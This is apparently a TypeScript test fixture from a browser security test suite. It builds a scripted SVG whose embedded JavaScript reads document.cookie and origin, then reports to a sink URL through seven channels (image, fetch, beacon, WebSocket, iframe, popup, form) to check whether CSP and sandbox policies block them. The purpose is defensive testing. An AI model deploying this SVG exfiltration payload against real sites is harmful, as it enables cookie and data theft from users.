/**
 * The exfiltration script every payload carries, parameterised only by which
 * sink URL prefix it reports to.
 *
 * ONE builder on purpose: a passing control and a failing negative must not be
 * explainable by "different fixtures". The only thing that differs between a
 * case and its control is the `caseTag`, which segregates the hit log so a late
 * beacon from an earlier test can never be counted against a later one.
 *
 * Vectors, and why each is here (they are the seven the experiment measured):
 *   img/fetch/beacon/ws/iframe — blocked by the SOURCE directives
 *   form/popup                 — blocked ONLY by the sandbox directive, because
 *                                no CSP directive covers popup navigation
 *
 * The form submit is NOT fired by the payload. It is published as
 * `window.__fireForm()` and fired by the TEST, after the in-page report has been
 * read. This fixes, rather than inherits, the experiment's own recorded harness
 * defect — "with no policy the form-submit probe navigates the document away
 * before the in-page report runs, so the `none` row has no report and a racy
 * egress list" (§6, "Known harness defect").
 *
 * A timer was tried first and is not good enough: with the form on a 400 ms
 * delay, Firefox 151 navigated the un-policed control page to the sink before
 * the test could read either `document.title` or `window.__REPORT__`, and both
 * came back EMPTY — a control that reports "the payload did nothing" for a
 * payload that in fact did everything. Chromium and WebKit happened to win the
 * same race, which is the worst possible outcome: two engines green, one red,
 * for a reason that has nothing to do with the product.
 */
function exfilScript(sinkOrigin: string, caseTag: string): string {
  return `
(function(){
  var U = function(v){ return ${JSON.stringify(sinkOrigin)} + "/x/${caseTag}/" + v; };
  var r = { fired: [] };
  try { r.origin = String(window.origin); } catch (e) { r.origin = "THREW:" + e.name; }
  try { r.cookie = document.cookie; } catch (e) { r.cookie = "THREW:" + e.name; }
  try { new Image().src = U("img"); r.fired.push("img"); } catch (e) {}
  try { fetch(U("fetch"), { mode: "no-cors" }).catch(function(){}); r.fired.push("fetch"); } catch (e) {}
  try { if (navigator.sendBeacon(U("beacon"), "x")) r.fired.push("beacon"); } catch (e) {}
  try { new WebSocket(U("ws").replace("http", "ws")); r.fired.push("ws"); } catch (e) {}
  var host = document.getElementById("host") || document.body || document.documentElement;
  try {
    var fr = document.createElementNS("http://www.w3.org/1999/xhtml", "iframe");
    fr.setAttribute("src", U("iframe")); host.appendChild(fr); r.fired.push("iframe");
  } catch (e) {}
  try { if (window.open(U("popup"))) r.fired.push("popup"); else r.fired.push("popup-returned-null"); } catch (e) {}
  window.__REPORT__ = r;
  // Fired by the test, never on a timer — see this builder's doc comment.
  window.__fireForm = function(){
    try {
      var fm = document.createElementNS("http://www.w3.org/1999/xhtml", "form");
      fm.setAttribute("action", U("form")); fm.setAttribute("method", "GET");
      host.appendChild(fm); fm.submit();
    } catch (e) {}
  };
})();
`;
}

/**
 * A scripted SVG.
 *
 * `width`/`height` are intrinsic so that "the browser DECODED this exact image"
 * is assertable as `naturalWidth === 64` rather than as the far weaker "the
 * request returned 200" — which is true of a broken image too (test 122 spells
 * this out: "Asserts the image DECODED — not merely a 200").
 *
 * The script sits inside `<foreignObject>`'s host div for the two vectors that
 * need HTML elements. CDATA because this is XML: an unescaped `&` or `<` in the
 * script would make the document unparseable, and an unparseable payload proves
 * nothing about what a parseable one would do.
 */
function scriptedSvg(sinkOrigin: string, caseTag: string, width = 64, height = 32): string {
  return `<svg xmlns="http://www.w3.org/2000/svg" width="${width}" height="${height}" viewBox="0 0 ${width} ${height}">
<rect width="${width}" height="${height}" fill="#D4AF37"/>
<foreignObject width="1" height="1"><div xmlns="http://www.w3.org/1999/xhtml" id="host"></div></foreignObject>
<script type="application/ecmascript"><![CDATA[
${exfilScript(sinkOrigin, caseTag)}
]]></script>
</svg>
`;
}

